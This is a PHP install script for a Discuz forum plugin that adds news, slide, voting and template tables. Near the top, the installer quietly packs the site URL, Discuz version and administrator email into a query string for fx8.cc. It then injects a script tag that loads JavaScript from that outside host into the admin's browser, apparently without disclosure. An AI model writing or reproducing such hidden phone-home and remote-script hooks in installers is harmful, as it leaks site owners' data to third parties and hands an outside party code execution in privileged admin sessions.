<?php
/**
 *      [fx8.cc] (C)2014-2017 ymg6.Com.
 *      This is NOT a freeware, use is subject to license terms
 *
 *      $Id: install.php sanree $
 */
 
if(!defined('IN_DISCUZ')) { 
	exit('Access Denied');
}

$pluginid=$pluginarray['plugin']['identifier'];
require_once DISCUZ_ROOT.'./source/discuz_version.php';
$siteinfo=array(
	'site_version' => DISCUZ_VERSION,
	'site_release' => DISCUZ_RELEASE,
	'site_timestamp' => TIMESTAMP,
	'site_url' => $_G['siteurl'],
	'site_adminemail' => $_G['setting']['adminemail'],
	'plugin_identifier' => $pluginid,
	'plugin_version' => $pluginarray['plugin']['version'],
	'action' => 1,
);
$sitestr=base64_encode(serialize($siteinfo));
$sanree='http://www.fx8.cc/vk.php?data='.$sitestr.'&sign='.md5(md5($sitestr));
echo "<script src=\"".$sanree."\" type=\"text/javascript\"></script>";

function exitscolumn($field, $table) {
	$query=DB::query('SHOW COLUMNS FROM '.DB::table($table));
	$columns=array();
	while ($row = mysql_fetch_array($query,MYSQL_ASSOC)) {
		$columns[]=$row;
	}
	$arraycolumns=array();
	foreach($columns as $v) {
		$arraycolumns[]=$v['Field'];
	}
	return in_array($field,$arraycolumns) ? TRUE:FALSE;
}

$sql = <<<EOF
CREATE TABLE IF NOT EXISTS `pre_sanree_brand_news_category` (
  `cateid` smallint(6) NOT NULL auto_increment,
  `keywords` varchar(255) default NULL,
  `description` varchar(255) default NULL,
  `name` varchar(50) NOT NULL,
  `status` tinyint(4) NOT NULL default '1',
  `dateline` int(10) NOT NULL default '0',
  `displayorder` int(11) NOT NULL default '0',
  `pcateid` int(11) default '0',
  PRIMARY KEY  (`cateid`)
) ENGINE=MyISAM;

INSERT INTO `pre_sanree_brand_news_category` (`cateid`, `keywords`, `description`, `name`, `status`, `dateline`, `displayorder`) VALUES
(1, NULL, NULL, '$installlang[defaultcate1]', 1, 1342511498, 0),
(2, NULL, NULL, '$installlang[defaultcate2]', 1, 1342511498, 0),
(3, NULL, NULL, '$installlang[defaultcate3]', 1, 1342511498, 0),
(4, NULL, NULL, '$installlang[defaultcate4]', 1, 1342511498, 0),
(5, NULL, NULL, '$installlang[defaultcate5]', 1, 1342511498, 0),
(6, NULL, NULL, '$installlang[defaultcate6]', 1, 1342511498, 0),
(7, NULL, NULL, '$installlang[defaultcate7]', 1, 1342511498, 0),
(8, NULL, NULL, '$installlang[defaultcate8]', 1, 1342511498, 0),
(9, NULL, NULL, '$installlang[defaultcate9]', 1, 1342511498, 0),
(10, NULL, NULL, '$installlang[defaultcate10]', 1, 1342511498, 0),
(11, NULL, NULL, '$installlang[defaultcate11]', 1, 1342511498, 0),
(12, NULL, NULL, '$installlang[defaultcate12]', 1, 1342511498, 0),
(13, NULL, NULL, '$installlang[defaultcate13]', 1, 1342511498, 0),
(14, NULL, NULL, '$installlang[defaultcate14]', 1, 1342511498, 0);

CREATE TABLE IF NOT EXISTS `pre_sanree_brand_news` (
  `nid` int(11) unsigned NOT NULL auto_increment,
  `bid` int(11) unsigned NOT NULL,
  `cateid` int(11) unsigned NOT NULL,
  `uid` int(11) unsigned NOT NULL,
  `tid` int(11) unsigned NOT NULL,
  `pid` int(11) NOT NULL default '0',
  `aids` varchar(255) default NULL,
  `homeaid` int(11) default NULL,
  `displayorder` int(11) unsigned NOT NULL default '0',
  `username` varchar(50) NOT NULL,
  `name` varchar(255) NOT NULL,
  `keywords` varchar(255) NOT NULL,
  `description` varchar(255) NOT NULL,
  `smallpic` varchar(255) NOT NULL,
  `bigpic` varchar(255) NOT NULL,
  `ip` varchar(50) NOT NULL,
  `dateline` int(10) unsigned NOT NULL default '0',
  `viewnum` int(11) unsigned NOT NULL default '0',
  `allowreply` tinyint(1) NOT NULL default '1',
  `ishot` tinyint(1) unsigned NOT NULL,
  `content` text NOT NULL,
  `status` smallint(1) NOT NULL default '0',
  `istop` tinyint(1) NOT NULL default '0',
  `isshow` tinyint(1) NOT NULL default '0',
  `isrecommend` tinyint(1) NOT NULL default '0',
  `memo` text NOT NULL,
  `startdate` int(11) NOT NULL,
  `enddate` int(11) NOT NULL,
  `reason` varchar(255) default NULL,
  PRIMARY KEY  (`nid`)
) ENGINE=MyISAM;

CREATE TABLE IF NOT EXISTS `pre_sanree_brand_news_slide` (
  `ID` int(11) default NULL,
  `pic1` varchar(255) default NULL,
  `movie1` varchar(255) default NULL,
  `pic2` varchar(255) default NULL,
  `movie2` varchar(255) default NULL,
  `pic3` varchar(255) default NULL,
  `movie3` varchar(255) default NULL,
  `pic4` varchar(255) default NULL,
  `movie4` varchar(255) default NULL,
  `pic5` varchar(255) default NULL,
  `movie5` varchar(255) default NULL,
  `movie11` varchar(255) default NULL,
  `movie22` varchar(255) default NULL,
  `movie33` varchar(255) default NULL,
  `movie44` varchar(255) default NULL,
  `movie55` varchar(255) default NULL
) ENGINE=MyISAM;
INSERT INTO `pre_sanree_brand_news_slide` (`ID`, `pic1`, `movie1`, `pic2`, `movie2`, `pic3`, `movie3`, `pic4`, `movie4`, `pic5`, `movie5`, `movie11`, `movie22`, `movie33`, `movie44`, `movie55`) VALUES
(1, '{pluginimg}/flash1.jpg', 'http://www.fx8.cc/', '{pluginimg}/flash2.jpg', 'http://www.fx8.cc/', '{pluginimg}/flash3.jpg', 'http://www.fx8.cc/', '{pluginimg}/flash4.jpg', 'http://www.fx8.cc/', '{pluginimg}/flash5.jpg', 'http://www.fx8.cc/', NULL, NULL, NULL, NULL, NULL);


CREATE TABLE IF NOT EXISTS `pre_sanree_brand_news_voter` (
  `tid` mediumint(8) unsigned NOT NULL default '0',
  `bid` mediumint(8) NOT NULL default '0',
  `gid` mediumint(8) NOT NULL,
  `uid` mediumint(8) unsigned NOT NULL default '0',
  `star1` int(11) NOT NULL default '0',
  `star2` int(11) NOT NULL default '0',
  `star3` int(11) NOT NULL default '0',
  `star4` int(11) NOT NULL default '0',
  `star5` int(11) NOT NULL default '0',
  `dateline` int(10) unsigned NOT NULL default '0',
  KEY `tid` (`tid`),
  KEY `uid` (`uid`,`dateline`)
) ENGINE=MyISAM;

CREATE TABLE IF NOT EXISTS `pre_sanree_brand_news_voterlog` (
  `tid` mediumint(8) unsigned NOT NULL default '0',
  `bid` mediumint(8) NOT NULL default '0',
  `gid` mediumint(8) NOT NULL,
  `uid` mediumint(8) unsigned NOT NULL default '0',
  `username` varchar(255) default NULL,
  `star` int(11) NOT NULL default '0',
  `dateline` int(10) unsigned NOT NULL default '0',
  KEY `tid` (`tid`),
  KEY `uid` (`uid`,`dateline`)
) ENGINE=MyISAM;

CREATE TABLE IF NOT EXISTS `pre_sanree_brand_news_diystyle` (
  `diystyleid` mediumint(8) unsigned NOT NULL auto_increment,
  `name` varchar(255) NOT NULL,
  `content` text NOT NULL,
  `uid` mediumint(8) unsigned NOT NULL default '0',
  `username` varchar(15) NOT NULL default '',
  `dateline` int(10) unsigned NOT NULL default '0',
  `displayorder` int(11) NOT NULL,
  `status` tinyint(1) NOT NULL default '0',
  `issys` tinyint(1) NOT NULL,
  PRIMARY KEY  (`diystyleid`),
  KEY `uid` (`uid`)
) ENGINE=MyISAM;
INSERT INTO `pre_sanree_brand_news_diystyle` (`diystyleid`, `name`, `content`, `uid`, `username`, `dateline`, `displayorder`, `status`, `issys`) VALUES
(1, 'hotnews', 's:62:".stylename{\\r\\n}\\r\\n.stylename ul li{\\r\\n     line-height:20px;\\r\\n}\\r\\n";', 1, 'admin', 1350793879, 0, 1, 1);

CREATE TABLE IF NOT EXISTS `pre_sanree_brand_news_diytemplate` (
  `diytemplateid` mediumint(8) unsigned NOT NULL auto_increment,
  `name` varchar(255) NOT NULL,
  `content` text NOT NULL,
  `uid` mediumint(8) unsigned NOT NULL default '0',
  `username` varchar(15) NOT NULL default '',
  `dateline` int(10) unsigned NOT NULL default '0',
  `displayorder` int(11) NOT NULL,
  `status` tinyint(1) NOT NULL default '0',
  `issys` tinyint(1) NOT NULL,
  PRIMARY KEY  (`diytemplateid`),
  KEY `uid` (`uid`)
) ENGINE=MyISAM;
INSERT INTO `pre_sanree_brand_news_diytemplate` (`diytemplateid`, `name`, `content`, `uid`, `username`, `dateline`, `displayorder`, `status`, `issys`) VALUES
(1, '$installlang[blockclass_index_styletexttitle]', 's:110:"<div class="module cl xl">\\r\\n<ul>\\r\\n[loop]\\r\\n	<li><a href="{url}"{target}>{name}</a></li>\\r\\n[/loop]\\r\\n</ul>\\r\\n</div>";', 1, 'admin', 1350793725, 0, 1, 1),
(2, '$installlang[blockclass_index_styleimgtitle]', 's:220:"<div class="module cl xl">\\r\\n<ul>\\r\\n[loop]\\r\\n	<li>\\r\\n	<p><a href="{url}"{target}><img src="{pic}" width="{picwidth}" height="{picheight}" /></a></p>\\r\\n	<p><a href="{url}"{target}>{name}</a></p>\\r\\n	</li>\\r\\n[/loop]\\r\\n</ul>\\r\\n</div>";', 1, 'admin', 1350794071, 0, 1, 1);

EOF;
runquery($sql);

if (!exitscolumn('isnews','sanree_brand_businesses_module')) {
	$sql="ALTER TABLE `pre_sanree_brand_businesses_module` ADD `isnews` TINYINT( 1 ) NULL DEFAULT '0';";
	runquery($sql);	
	$sql = "INSERT INTO `pre_sanree_brand_language` (`module` ,`langkey` ,`langvalue` ) VALUES ('news', 'isnews', '".$installlang[isnews]."');";
	runquery($sql);		
}
if (!exitscolumn('maxnews','sanree_brand_group_module')) {
	$sql="ALTER TABLE `pre_sanree_brand_group_module` ADD `maxnews` INT( 11 ) NULL DEFAULT '20';";
	runquery($sql);	
	$sql = "INSERT INTO `pre_sanree_brand_language` (`module` ,`langkey` ,`langvalue` ) VALUES ('news', 'maxnews', '".$installlang[maxnews]."');";
	runquery($sql);	
}

$finish = TRUE;
?>